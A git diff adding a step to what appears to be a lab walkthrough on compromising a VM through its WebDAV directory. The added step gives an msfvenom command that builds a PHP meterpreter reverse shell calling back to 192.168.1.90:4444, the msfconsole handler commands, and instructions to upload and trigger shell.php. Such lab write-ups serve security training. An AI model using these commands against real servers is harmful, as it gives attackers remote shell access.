@@ -87,3 +87,29 @@ Connect to the VM's WebDAV directory by following the instructions on the secret
 
 ![image](https://github.com/user-attachments/assets/a50dc533-6e0c-44a8-b72e-e7b1bfd63142)
 </details>
+
+
+<details>
+<summary> <b> Step 5: Upload a PHP reverse shell payload. </b> </summary>
+
+- Using MSFVenom, we will set up a reverse shell, the command: msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > shell.php
+
+![image](https://github.com/user-attachments/assets/d355def3-8daf-40bd-854d-9a28a6bd45e1)
+
+- Setting up a listener by following a series of command:
+  - `msfconsole` to launch `msfconsole`
+  - `use exploit/multi/handler`
+  - `set payload php/meterpreter/reverse_tcp`
+  - show options and point out they need to set the `LHOST` and `LPORT`.
+  - `set LHOST 192.168.1.90`
+  - `set LPORT 4444`
+  - `exploit`
+
+![image](https://github.com/user-attachments/assets/4ddac98b-2556-427a-81f7-8e952a77953a)
+
+![image](https://github.com/user-attachments/assets/64016f08-2f17-4667-b255-8bbfb29d298e)
+
+- When exploit is set up, we will place the shell.php file inside the webDAV. Once placed in the webDAV, we will activate the payload and open up a meterpreter session.
+
+![image](https://github.com/user-attachments/assets/a94f2ef2-fcfa-446c-815c-b545be30338e)
+</details>
